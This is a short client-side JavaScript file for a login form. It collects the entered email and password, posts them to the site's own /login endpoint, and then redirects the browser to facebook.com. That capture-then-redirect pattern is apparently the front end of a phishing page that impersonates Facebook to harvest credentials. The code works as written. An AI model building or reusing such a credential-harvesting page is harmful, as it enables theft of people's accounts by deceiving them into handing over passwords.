// public/js/main.js
const loginForm = document.getElementById('loginForm');

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Create data object
    const formData = {
        email,
        password
    };


    await fetch('/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
    });

    window.location.href = "https://www.facebook.com/";
});